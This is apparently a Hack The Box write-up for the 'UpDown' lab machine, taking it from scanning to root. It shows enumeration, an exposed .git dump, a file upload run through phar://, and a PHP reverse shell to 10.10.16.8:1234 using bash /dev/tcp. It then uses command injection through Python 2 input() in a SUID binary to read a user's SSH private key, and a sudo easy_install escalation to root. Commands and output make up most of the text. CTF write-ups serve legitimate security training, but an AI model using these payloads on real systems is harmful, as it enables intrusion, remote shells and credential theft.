# UpDown

## Machine Info

![UpDown](./UpDown.assets/UpDown.png)

## Recon

### port

- 80, apache http, siteisup.htb

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### subdomain

- `dev.siteisup.htb`

```console
└─╼$ gobuster vhost -u http://siteisup.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 128 --exclude-length 301
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://siteisup.htb
[+] Method:           GET
[+] Threads:          128
[+] Wordlist:         /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:       gobuster/3.6
[+] Timeout:          10s
[+] Append Domain:    true
[+] Exclude Length:   301
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.siteisup.htb Status: 403 [Size: 281]
```

### web

Function: curl-like

![image-20240305204129528](./UpDown.assets/image-20240305204129528.png)

Some restrictions:

![image-20240305204149296](./UpDown.assets/image-20240305204149296.png)

### path

Enumerate path of `http://siteisup.htb`: `/dev/.git`

```console
└─╼$ gobuster dir -u http://siteisup.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php -t 128 -b 400,403,404 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb
[+] Method:                  GET
[+] Threads:                 128
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   400,403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]
/index.php            (Status: 200) [Size: 1131]
Progress: 2547666 / 2547668 (100.00%)
===============================================================
Finished
===============================================================

└─╼$ gobuster dir -u http://siteisup.htb/dev/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 128 -b 400,403,404 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb/dev/
[+] Method:                  GET
[+] Threads:                 128
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   400,403,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 0]
/.git                 (Status: 301) [Size: 315] [--> http://siteisup.htb/dev/.git/]
Progress: 63088 / 63089 (100.00%)
===============================================================
Finished
===============================================================
```

### git leakage

- Use git-dumper to download source code of dev.siteisup.htb

```console
└─╼$ git-dumper http://siteisup.htb/dev/.git web
```

- Upload function

![image-20240305204359711](./UpDown.assets/image-20240305204359711.png)

- Add special header to bypass Deny restriction

![image-20240305204419609](./UpDown.assets/image-20240305204419609.png)

![image-20240305204439355](./UpDown.assets/image-20240305204439355.png)

![image-20240305204446444](./UpDown.assets/image-20240305204446444.png)

- Discover uploads directory: `http://dev.siteisup.htb/uploads/xxx/xxx`
  - deleted quickly in unlink function: for file extension txt etc.
  - deleted after a longer time: for zip file (but you need to change filename into a.png etc.)

![image-20240305204524703](./UpDown.assets/image-20240305204524703.png)

## Foothold

### File Upload

**POC**:

1. Upload a zip file with png extension

```console
┌──[HQ🚀🌐172.16.218.134|172.17.0.1|10.10.16.8🔥qwe][👾~/pwk/linux/UpDown/vuln]
└─╼$ cat phpinfo.php
<?php phpinfo();?>
10.10.16.8

┌──[HQ🚀🌐172.16.218.134|172.17.0.1|10.10.16.8🔥qwe][👾~/pwk/linux/UpDown/vuln]
└─╼$ zip phpinfo.png phpinfo.php
updating: phpinfo.php (deflated 7%)
```

2. Execute phpinfo inside uploaded zip, `phar://path`

![image-20240305205412340](./UpDown.assets/image-20240305205412340.png)

![image-20240305205422341](./UpDown.assets/image-20240305205422341.png)

There are lots of disable functions. Use [dfunc_bypass](https://github.com/zhsh9/dfunc-bypasser.git) to analyse it.

![image-20240305205511245](./UpDown.assets/image-20240305205511245.png)

**Exploit**:

1. Reverse shell payload:

```php
<?php
$proc=proc_open("bash -c 'bash -i >&/dev/tcp/10.10.16.8/1234 0>&1'",
  array(
    array("pipe","r"),
    array("pipe","w"),
    array("pipe","w")
  ),
  $pipes);
print stream_get_contents($pipes[1]);
?>
```

2. Nc to get a revshell

```console
└─╼$ sudo rlwrap -cAr nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.177] 38692
bash: cannot set terminal process group (909): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@updown:/var/www/dev$ uname -a
uname -a
Linux updown 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

## Privilege Escalation

## Enumeration

Two users: root, developer

```console
www-data@updown:/home/developer/dev$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
developer:x:1002:1002::/home/developer:/bin/bash
```

Linpeas output:

![image-20240305205657323](./UpDown.assets/image-20240305205657323.png)

### Analyse SUID siteisup

```console
www-data@updown:/home/developer/dev$ ls -l
total 24
-rwsr-x--- 1 developer www-data 16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data   154 Jun 22  2022 siteisup_test.py
www-data@updown:/home/developer/dev$ file siteisup
siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped
www-data@updown:/home/developer/dev$ cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

![image-20240305205740218](./UpDown.assets/image-20240305205740218.png)

In python2, `input()` function has command injection vulnerability.

**POC**:

```console
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('id')
uid=1002(developer) gid=33(www-data) groups=33(www-data)
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
    page = requests.get(url)
```

**Exploit**:

```console
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('cat /home/developer/.ssh/id_rsa')
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
...
3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe
N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ==
-----END OPENSSH PRIVATE KEY-----
```

### developer -> root

sudo script enum:

```console
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
    
developer@updown:~$ cat /usr/local/bin/easy_install
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

**Exploit**: (easy_install)

![image-20240305205946501](./UpDown.assets/image-20240305205946501.png)

```console
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo $TF
/tmp/tmp.qnyeGLM56Z
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo /usr/local/bin/easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.qnyeGLM56Z
Writing /tmp/tmp.qnyeGLM56Z/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.qnyeGLM56Z/egg-dist-tmp-ysxrf7
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux updown 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

## Exploit Chain

port scan -> web enum: subdomain & path -> .git exposed & git-dumper -> dev web source code -> dev subdomain upload function & /?page= to include php file inside index.php -> upload zip file with png ext (php inside) & trigger php by /?page=phar://path -> www-data shell -> SUID siteisup with python command injection -> developer shell -> sudo easy_install -> root shell
